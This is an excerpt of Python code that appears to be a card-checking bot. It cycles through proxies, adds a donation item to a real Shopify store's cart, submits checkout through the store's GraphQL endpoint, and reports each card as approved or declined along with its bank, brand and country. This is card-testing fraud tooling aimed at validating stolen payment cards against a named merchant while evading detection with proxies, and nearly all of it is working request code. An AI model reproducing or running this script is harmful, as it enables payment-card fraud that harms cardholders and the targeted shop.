...
async def sh(card_input: str, proxy_manager):
    ...
    async with aiohttp.ClientSession(connector=connector) as r:
        ...
        url = "https://zombieclawpolish.com/cart/add.js"
        headers = {
            'authority': 'https://zombieclawpolish.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://zombieclawpolish.com',
            'referer': 'https://zombieclawpolish.com/products/donation-1-for-perseus',
        ...
        try:
            async with r.get('https://zombieclawpolish.com/cart.js', headers=headers, timeout=30) as response:
        ...
        headers = {
            ...
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://zombieclawpolish.com',
            'referer': 'https://zombieclawpolish.com/cart',
        ...
        try:
            response = await r.post(
                'https://zombieclawpolish.com/cart',
                headers=headers,
                data=data,
        ...
        json_data = {
            ...
            'payment_session_scope': 'zombieclawpolish.com',
        }
        ...
        headers = {
            'authority': 'zombieclawpolish.com',
            'accept': 'application/json',
        ...
        json_data = {
            ...
            'variables': {
                        ...
                        'merchandiseLines': [
                            {
                                ...
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': 'gid://shopify/ProductVariantMerchandise/45269785739434',
                                        'variantId': 'gid://shopify/ProductVariant/45269785739434',
                                        'properties': [],
                                        'sellingPlanId': None,
                ...
                'metafields': [],
                'analytics': {
                    'requestUrl': f'https://zombieclawpolish.com/checkouts/cn/{tok}/en-in?auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
                },
            },
            'operationName': 'SubmitForCompletion',
        }
        ...
        # UPDATED POLLING SECTION WITH "THANK" KEYWORD
        try:
            async with r.post(
                'https://zombieclawpolish.com/checkouts/unstable/graphql',
                params=params,
...
[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
                        ...
                        logger.info(f"Retry {retry_count + 1}/{max_retries}: Processing receipt, waiting 3 seconds...")
                        await asyncio.sleep(3)
                        continue
                    else:
                        fff = find_between(final_text, '"code":"', '"')
                        error_msg = fff if fff else 'Payment failed'
                        return ShResult(
                            f"""𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
...
[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
                ...
                proxy_manager.mark_bad(proxy)
                proxy_status = "Dead"
                return ShResult("Retry request timed out", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, flag, currency, "")
            except Exception as e:
                logger.error(f"Retry {retry_count + 1} failed: {str(e)}")
                if retry_count == max_retries - 1:
                    return ShResult(
                        f"Final retry failed: {str(e)}",
                        elapsed_time,
                        proxy_status,
                        "Error",
                        f"{type} - {level} - {brand}",
